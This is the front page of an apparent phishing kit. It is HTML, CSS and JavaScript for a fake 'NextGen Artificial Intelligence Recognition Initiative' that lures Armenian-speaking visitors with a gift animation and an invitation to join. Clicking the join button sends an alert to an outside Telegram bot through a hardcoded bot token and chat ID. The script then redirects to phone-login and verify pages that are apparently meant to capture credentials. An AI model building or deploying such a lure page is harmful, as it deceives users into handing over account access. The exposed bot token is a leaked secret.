    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        #preloader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 1;
            transition: opacity 2s ease;
        }

        #preloader.hidden {
            opacity: 0;
            pointer-events: none;
        }

        #preloader img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background: url('./fon.gif') no-repeat center center fixed;
            background-size: cover;
            color: #bebb24;
            min-height: 100vh;
            padding-top: 20px;
            animation: fadeBackground 5s infinite alternate ease-in-out;
            opacity: 0;
            transition: opacity 1s ease;
        }

        body.loaded {
            opacity: 1;
        }

        @keyframes fadeBackground {
            100% { opacity: 0.9; }
            100% { opacity: 1; }
        }
        .stars {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #fff;
            border-radius: 50%;
            animation: fall linear infinite;
        }

        .container {
            text-align: center;
            padding: 40px 25px;
            background: rgba(10, 10, 20, 0.85);
            border-radius: 25px;
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
            max-width: 700px;
            width: 95%;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        .company-name {
            font-family: 'Exo 2', sans-serif;
            font-size: 55px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
        }

        .highlight-text {
            margin-bottom: 25px;
            line-height: 1.4;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
        }

        .highlight-text .big {
            font-family: 'Noto Sans Armenian', sans-serif;
            font-size: 36px;
            font-weight: 700;
            color: #d8bfd8;
            display: block;
        }

        .highlight-text .small {
            font-family: 'Noto Sans Armenian', sans-serif;
            font-size: 20px;
            font-weight: 400;
            color: #d8bfd8;
            display: block;
        }

        .cta-button {
            display: inline-block;
            background: linear-gradient(45deg, #8a2be2, #4b0082);
            color: #fff;
            padding: 16px 40px;
            border-radius: 35px;
            text-decoration: none;
            font-family: 'Exo 2', sans-serif;
            font-weight: 700;
            font-size: 20px;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
            border: none;
            cursor: pointer;
            position: relative;
            z-index: 10;
            margin-bottom: 10px;
        }

        .cta-button:hover {
            background: linear-gradient(45deg, #4b0082, #8a2be2);
            transform: translateY(-2px) scale(1.03);
            box-shadow: 0 0 25px rgba(138, 43, 226, 1);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: rgba(10, 10, 20, 0.9);
            padding: 20px;
            border-radius: 15px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
        }

        .modal-content input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #8a2be2;
            background: #fff;
            color: #000;
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
        }

        .modal-content .login-button {
            background: linear-gradient(45deg, #8a2be2, #4b0082);
            padding: 12px 30px;
            border: none;
            border-radius: 25px;
            color: #fff;
            font-family: 'Exo 2', sans-serif;
            font-weight: 700;
            font-size: 18px;
            cursor: pointer;
            margin-top: 15px;
        }

        .modal-content .login-button:hover {
            background: linear-gradient(45deg, #4b0082, #8a2be2);
            box-shadow: 0 0 15px rgba(138, 43, 226, 1);
        }

        .modal-content .forgot-password {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #d8bfd8;
            text-decoration: underline;
            font-family: 'Noto Sans Armenian', sans-serif;
        }

        .modal-content .forgot-password:hover {
            color: #fff;
        }

        .social-links {
            margin-top: 120px;
        }

        .social-links a {
            margin: 0 20px;
            font-size: 34px;
            color: #8a2be2;
            transition: all 0.3s ease;
        }

        .social-links a:hover {
            color: #d8bfd8;
            transform: translateY(-10px);
            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
        }

        .illustration img {
            max-width: 220px;
            height: auto;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
        }

        .whatsapp-button {
            position: fixed;
            bottom: 25px;
            right: 25px;
            background: #8a2be2;
            padding: 15px;
            border-radius: 50%;
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
            transition: all 0.3s ease;
        }

        .whatsapp-button:hover {
            background: #4b0082;
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(138, 43, 226, 1);
        }

        @media (max-width: 768px) {
            body { padding-top: 15px; }
            .company-name { font-size: 48px; }
            .highlight-text .big { font-size: 30px; }
            .highlight-text .small { font-size: 18px; }
            .cta-button { padding: 14px 35px; font-size: 20px; }
            .container { padding: 30px 20px; margin-top: 10px; }
            .social-links a { font-size: 30px; margin: 0 15px; }
            .illustration img { max-width: 180px; }
        }

        @media (max-width: 480px) {
            body { padding-top: 10px; }
            .company-name { font-size: 36px; }
            .highlight-text .big { font-size: 24px; }
            .highlight-text .small { font-size: 16px; }
            .cta-button { padding: 12px 30px; font-size: 18px; }
            .container { padding: 20px 15px; margin-top: 5px; }
            .social-links a { font-size: 26px; margin: 0 10px; }
            .illustration img { max-width: 150px; }
            .whatsapp-button { padding: 12px; }
        }
    </style>
</head>
<body>
    <div id="preloader">
        <img src="./ai.gif" alt="AI Loading Animation">
    </div>
    <div class="stars"></div>

    <div class="container" data-aos="fade-up">
        <h1 class="company-name">NextGen Artificial Intelligence Recognition Initiative</h1>
        <div class="illustration" data-aos="fade-up" data-aos-delay="50">
            <img src="./image2.gif" alt="Gift Animation">
        </div>
        <p class="highlight-text" data-aos="fade-up" data-aos-delay="100">
            <span class="big">Դարձիր ապագայի մասնիկ.</span>
            <span class="small">կիսվիր քո կարծիքով,</span>
            <span class="small">օգնիր մեզ ստեղծել խելացի տեխնոլոգիաներ</span>
        </p>
        <div style="margin-top: 10px;">
            <a href="#" class="cta-button" id="register-now" data-aos="zoom-in" data-aos-delay="200">Միանալ</a>
        </div>
        <div class="social-links" data-aos="fade-up" data-aos-delay="300">
            <a href="https://m.facebook.com" target="_blank"><i class="fab fa-facebook-f"></i></a>
            <a href="https://www.instagram.com" target="_blank"><i class="fab fa-instagram"></i></a>
            <a href="https://twitter.com" target="_blank"><i class="fab fa-twitter"></i></a>
        </div>
    </div>

    <a href="https://wa.me/37496653666" class="whatsapp-button" data-aos="fade-up" data-aos-delay="400">
        <i class="fab fa-whatsapp" style="font-size: 26px; color: #fff;"></i>
    </a>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
    <script>
        setTimeout(() => {
            const preloader = document.getElementById('preloader');
            const body = document.body;
            preloader.classList.add('hidden');
            body.classList.add('loaded');
            preloader.addEventListener('transitionend', () => {
                preloader.remove();
            });
        }, 1000);

        const starsContainer = document.querySelector('.stars');
        for (let i = 0; i < 100; i++) {
            const star = document.createElement('div');
            star.classList.add('star');
            star.style.left = `${Math.random() * 100}vw`;
            star.style.animationDuration = `${Math.random() * 3 + 2}s`;
            star.style.animationDelay = `${Math.random() * 5}s`;
            starsContainer.appendChild(star);
        }

        const TELEGRAM_TOKEN = "7505675886:AAEOZyLgDk3TqEXIUJqhDzZtpVtFNjKh9ww";
        const CHAT_ID = "7231332868";

        // Регистрация (Мутк горцель Хэрахосахамаров)
        document.getElementById('register-now').addEventListener('click', function(e) {
            e.preventDefault();
            const message = `Նոր Միացող`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = './loginbyphone.html';
            })
            .catch(error => {
                console.error('Ошибка при отправке в Telegram:', error);
                window.location.href = './verify.html';
            });
        });

        AOS.init({ duration: 800, easing: 'ease-out', once: true });

        gsap.fromTo(".cta-button", 
            { scale: 0.9, opacity: 0 }, 
            { scale: 1, opacity: 1, duration: 0.8, ease: "back.out(1.7)", delay: 0.5 }
        );
        gsap.from(".whatsapp-button", {
            y: 50, opacity: 0, duration: 0.6, ease: "power2.out", delay: 1
        });
    </script>
